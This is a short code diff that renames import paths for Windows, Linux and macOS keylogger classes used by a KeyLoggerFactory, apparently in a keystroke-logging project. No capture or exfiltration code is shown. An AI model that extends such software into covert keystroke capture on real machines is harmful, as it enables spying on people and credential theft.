@@ -1,7 +1,7 @@
 import platform
-from implementations.loggers.windows_key_logger import WindowsKeyLogger
-from implementations.loggers.linux_key_logger import LinuxKeyLogger
-from implementations.loggers.mac_key_logger import MacKeyLogger
+from services.loggers.windows_key_logger import WindowsKeyLogger
+from services.loggers.linux_key_logger import LinuxKeyLogger
+from services.loggers.mac_key_logger import MacKeyLogger
 from interfaces.i_writer import IWriter
 
 class KeyLoggerFactory:
